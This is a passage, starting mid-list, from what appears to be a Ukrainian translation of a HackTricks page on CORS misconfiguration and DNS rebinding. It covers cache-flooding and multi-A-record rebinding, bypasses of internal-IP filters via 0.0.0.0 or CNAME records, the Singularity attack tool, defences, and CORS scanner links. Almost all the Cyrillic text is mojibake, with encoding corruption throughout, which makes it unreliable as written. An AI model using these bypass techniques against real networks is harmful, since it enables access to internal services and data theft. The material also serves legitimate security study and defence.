2. –©–æ–± –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç –∫–µ—à—É–≤–∞–Ω–Ω—è, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ—Ä–≤—ñ—Å–Ω–∏–π —Ä–æ–±—ñ—Ç–Ω–∏–∫. –°–µ—Ä–≤—ñ—Å–Ω–∏–π —Ä–æ–±—ñ—Ç–Ω–∏–∫ –∑–∞–ø–æ–≤–Ω—é—î –∫–µ—à DNS, —â–æ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤–∏–¥–∞–ª—è—î –∫–µ—à–æ–≤–∞–Ω–µ —ñ–º'—è —Å–µ—Ä–≤–µ—Ä–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.
3. –ö–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä –∂–µ—Ä—Ç–≤–∏ —Ä–æ–±–∏—Ç—å –¥—Ä—É–≥–∏–π DNS-–∑–∞–ø–∏—Ç, –Ω–∞ –Ω—å–æ–≥–æ —Ç–µ–ø–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î IP-–∞–¥—Ä–µ—Å–∞ 127.0.0.1, —è–∫–∞ –∑–∞–∑–≤–∏—á–∞–π –ø–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ localhost.

–ó–∞–ø–æ–≤–Ω—é—é—á–∏ –∫–µ—à DNS –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ —Ä–æ–±—ñ—Ç–Ω–∏–∫–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –ø—Ä–æ—Ü–µ—Å–æ–º —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è DNS —ñ –ø—Ä–∏–º—É—Å–∏—Ç–∏ –±—Ä–∞—É–∑–µ—Ä –∂–µ—Ä—Ç–≤–∏ –∑—Ä–æ–±–∏—Ç–∏ –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Ç, —Ü—å–æ–≥–æ —Ä–∞–∑—É —Ä–æ–∑–≤'—è–∑—É—é—á–∏ –Ω–∞ –±–∞–∂–∞–Ω—É IP-–∞–¥—Ä–µ—Å—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞.

### DNS Rebinding —á–µ—Ä–µ–∑ **Cache**

–©–µ –æ–¥–∏–Ω —Å–ø–æ—Å—ñ–± –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç –∫–µ—à—É–≤–∞–Ω–Ω—è - —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö IP-–∞–¥—Ä–µ—Å –¥–ª—è –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ —Å—É–±–¥–æ–º–µ–Ω—É —É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ DNS. –û—Å—å —è–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:

1. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–ª–∞—à—Ç–æ–≤—É—î –¥–≤–∞ A-–∑–∞–ø–∏—Å–∏ (–∞–±–æ –æ–¥–∏–Ω A-–∑–∞–ø–∏—Å –∑ –¥–≤–æ–º–∞ IP) –¥–ª—è –æ–¥–Ω–æ–≥–æ –π —Ç–æ–≥–æ –∂ —Å—É–±–¥–æ–º–µ–Ω—É —É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ DNS.
2. –ö–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ü—ñ –∑–∞–ø–∏—Å–∏, –≤—ñ–Ω –æ—Ç—Ä–∏–º—É—î –æ–±–∏–¥–≤—ñ IP-–∞–¥—Ä–µ—Å–∏.
3. –Ø–∫—â–æ –±—Ä–∞—É–∑–µ—Ä –≤–∏—Ä—ñ—à—É—î —Å–ø–æ—á–∞—Ç–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —è–∫–µ –≤–∏–∫–æ–Ω—É—î HTTP-–∑–∞–ø–∏—Ç–∏ –¥–æ —Ç–æ–≥–æ –∂ –¥–æ–º–µ–Ω—É.
4. –û–¥–Ω–∞–∫, —è–∫ —Ç—ñ–ª—å–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –æ—Ç—Ä–∏–º—É—î IP-–∞–¥—Ä–µ—Å—É –∂–µ—Ä—Ç–≤–∏, –≤—ñ–Ω –ø–µ—Ä–µ—Å—Ç–∞—î –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –±—Ä–∞—É–∑–µ—Ä—É –∂–µ—Ä—Ç–≤–∏.
5. –ë—Ä–∞—É–∑–µ—Ä –∂–µ—Ä—Ç–≤–∏, —É—Å–≤—ñ–¥–æ–º–∏–≤—à–∏, —â–æ –¥–æ–º–µ–Ω –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î, –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç—å –¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥—Ä—É–≥–æ—ó –Ω–∞–¥–∞–Ω–æ—ó IP-–∞–¥—Ä–µ—Å–∏.
6. –î–æ—Å—Ç—É–ø–∞—é—á–∏ –¥–æ –¥—Ä—É–≥–æ—ó IP-–∞–¥—Ä–µ—Å–∏, –±—Ä–∞—É–∑–µ—Ä –æ–±–º–∏–Ω–∞—î –ü–æ–ª—ñ—Ç–∏–∫—É –æ–¥–Ω–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è (SOP), —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º —ñ –∑–±–∏—Ä–∞—Ç–∏ —Ç–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.

–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–æ–≤–µ–¥—ñ–Ω–∫—É –±—Ä–∞—É–∑–µ—Ä—ñ–≤, –∫–æ–ª–∏ –¥–ª—è –¥–æ–º–µ–Ω—É –Ω–∞–¥–∞—é—Ç—å—Å—è –∫—ñ–ª—å–∫–∞ IP-–∞–¥—Ä–µ—Å. –°—Ç—Ä–∞—Ç–µ–≥—ñ—á–Ω–æ –∫–æ–Ω—Ç—Ä–æ–ª—é—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Ç–∞ –º–∞–Ω—ñ–ø—É–ª—é—é—á–∏ –≤–∏–±–æ—Ä–æ–º IP-–∞–¥—Ä–µ—Å–∏ –±—Ä–∞—É–∑–µ—Ä–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ SOP —ñ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—ñ–¥ –∂–µ—Ä—Ç–≤–∏.

{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ localhost –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–ø—Ä–∏–≤'—è–∑–∞—Ç–∏ **127.0.0.1** —É Windows —ñ **0.0.0.0** —É Linux.\
–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∏, —Ç–∞–∫—ñ —è–∫ godaddy –∞–±–æ cloudflare, –Ω–µ –¥–æ–∑–≤–æ–ª–∏–ª–∏ –º–µ–Ω—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ IP 0.0.0.0, –∞–ª–µ AWS route53 –¥–æ–∑–≤–æ–ª–∏–≤ –º–µ–Ω—ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–¥–∏–Ω A-–∑–∞–ø–∏—Å –∑ 2 IP, –æ–¥–∏–Ω –∑ —è–∫–∏—Ö "0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### –Ü–Ω—à—ñ –∑–∞–≥–∞–ª—å–Ω—ñ –æ–±—Ö–æ–¥–∏

* –Ø–∫—â–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ IP –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ**, –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å **–∑–∞–±—É—Ç–∏ –∑–∞–±–æ—Ä–æ–Ω–∏—Ç–∏ 0.0.0.0** (–ø—Ä–∞—Ü—é—î –Ω–∞ Linux —ñ Mac)
* –Ø–∫—â–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ IP –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ**, –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–π—Ç–µ –∑ **CNAME** –Ω–∞ **localhost** (–ø—Ä–∞—Ü—é—î –Ω–∞ Linux —ñ Mac)
* –Ø–∫—â–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ IP –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ** —è–∫ DNS-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏ **CNAME –Ω–∞ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ —Å–µ—Ä–≤—ñ—Å–∏**, —Ç–∞–∫—ñ —è–∫ www.corporate.internal.

### –ó–±—Ä–æ—è DNS Rebidding

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –æ–±—Ö–æ–¥—É —Ç–∞ —è–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —É –¥–æ–ø–æ–≤—ñ–¥—ñ [Gerald Doussot - –°—Ç–∞–Ω –∞—Ç–∞–∫ DNS Rebinding & –£–Ω—ñ–∫–∞–ª—å–Ω—ñ—Å—Ç—å –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è - –∫–æ–Ω—Ñ–µ—Ä–µ–Ω—Ü—ñ—è DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`–£–Ω—ñ–∫–∞–ª—å–Ω—ñ—Å—Ç—å –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è`**](https://github.com/nccgroup/singularity) - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) –∞—Ç–∞–∫. –í—ñ–Ω –≤–∫–ª—é—á–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –¥–ª—è –ø–µ—Ä–µ–ø—Ä–∏–≤'—è–∑–∫–∏ IP-–∞–¥—Ä–µ—Å–∏ DNS-—ñ–º–µ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ –∞—Ç–∞–∫–∏ –¥–æ IP-–∞–¥—Ä–µ—Å–∏ —Ü—ñ–ª—å–æ–≤–æ—ó –º–∞—à–∏–Ω–∏ —Ç–∞ –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –∞—Ç–∞–∫—É—é—á–∏—Ö –∫–æ—Ä–∏—Å–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –Ω–∞ —Ü—ñ–ª—å–æ–≤—ñ–π –º–∞—à–∏–Ω—ñ.

### –†–µ–∞–ª—å–Ω–∏–π –∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ DNS Rebinding

* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ TLS —É –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Å–µ—Ä–≤—ñ—Å–∞—Ö
* –ó–∞–ø–∏—Ç—É–π—Ç–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∞–Ω–∏—Ö
* –ü–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): –ü—Ä–æ–ø–æ–∑–∏—Ü—ñ—è –∑–∞–≤–∂–¥–∏ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–∞–ø–∏—Ç, –∫–æ–ª–∏ –ø—É–±–ª—ñ—á–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∏ —Ö–æ—á—É—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —Å–µ—Ä–≤–µ—Ä—ñ–≤

## **–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –º–æ–∂–ª–∏–≤—ñ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –≤ –ø–æ–ª—ñ—Ç–∏–∫–∞—Ö CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
{% endhint %}
